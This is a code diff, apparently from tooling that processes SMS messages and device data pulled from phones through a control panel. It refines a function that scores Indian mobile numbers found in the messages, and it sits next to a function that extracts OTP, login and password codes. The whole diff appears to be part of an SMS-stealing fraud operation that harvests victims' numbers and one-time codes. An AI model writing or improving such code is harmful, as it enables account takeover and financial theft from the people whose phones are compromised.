@@ -32,30 +32,52 @@ def decode_panel_url(panel_url):
 
 def extract_best_numbers(dev_data, msgs):
     all_text = " ".join([m.get("message", "") for m in msgs])
+    
+    # Strict regex for Indian numbers (10 digits, starting with 6-9)
     matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_text)
-    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577"}
+    
+    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890"}
     matches = [m for m in matches if m not in bad_numbers]
     
     counts = Counter(matches)
     scored_numbers = []
+    
     for num, count in counts.items():
         score = min(count * 15, 60) 
+        
+        # Check if it came from Jio/Airtel (100% chance as you said)
+        is_carrier = False
         for m in msgs:
             sender = str(m.get("sender", "")).lower()
-            if num in m.get("message", ""):
+            msg_text = m.get("message", "")
+            if num in msg_text:
                 if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
-                    score += 30; break
-        scored_numbers.append((num, min(score, 99)))
+                    is_carrier = True
+                    break
+                if any(c in msg_text.lower() for c in ["jio", "airtel", "vi", "bsnl"]):
+                    is_carrier = True
+                    break
+        
+        if is_carrier:
+            score = 100 # 100% pakka number hai
+        else:
+            score = min(score + 20, 99) # Repeat logic chance
+            
+        scored_numbers.append((num, score))
 
+    # Direct device metadata check
     for key in ["phoneNumber", "phone", "number", "mobile"]:
         if dev_data.get(key):
             n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
-            if len(n) == 10 and n not in bad_numbers: scored_numbers.append((n, 100))
+            if len(n) == 10 and n not in bad_numbers:
+                scored_numbers.append((n, 100))
 
     best_nums = {}
     for n, s in scored_numbers:
-        if n not in best_nums or s > best_nums[n]: best_nums[n] = s
-    return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2]
+        if n not in best_nums or s > best_nums[n]:
+            best_nums[n] = s
+            
+    return sorted(best_nums.items(), key=lambda x: x[1], reverse=True)[:2] # Top 2 real numbers
 
 def extract_otp(text):
     if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password"]): return None
